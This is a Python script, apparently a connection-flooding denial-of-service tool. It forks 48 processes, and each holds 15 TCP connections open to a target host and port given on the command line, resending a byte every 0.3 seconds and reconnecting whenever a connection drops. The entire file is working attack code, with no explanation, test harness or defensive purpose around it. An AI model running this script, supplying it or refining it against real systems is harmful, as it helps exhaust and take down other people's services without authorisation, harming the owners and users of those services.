import socket
import sys
import signal
import time
import os


def make_socket(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, int(port)))
        return sock
    except socket.error as e:
        print("Could not connect: %s" % e)
        sys.exit(1)


def broke(signal, frame):
    pass


CONNECTIONS = 15
THREADS = 48


def attack(host, port, thread_id):
    sockets = []
    for _ in range(CONNECTIONS):
        sockets.append(None)
    signal.signal(signal.SIGPIPE, broke)
    while True:
        for x in range(CONNECTIONS):
            if sockets[x] is None:
                sockets[x] = make_socket(host, port)
            try:
                sockets[x].sendall(b'\x00')
            except socket.error:
                sockets[x].close()
                sockets[x] = make_socket(host, port)
            else:
                print("Attacking "+host+" at port "+port)
        print("Attacking "+host+" at port "+port)
        time.sleep(0.3)



def main():
        threads = []
        for x in range(THREADS):
            pid = os.fork()
            if pid > 0:
                threads.append(pid)
            elif pid == 0:
                attack(sys.argv[1], sys.argv[2], x)
                sys.exit()
            time.sleep(0.2)
        input() 


if __name__ == '__main__':
    main()
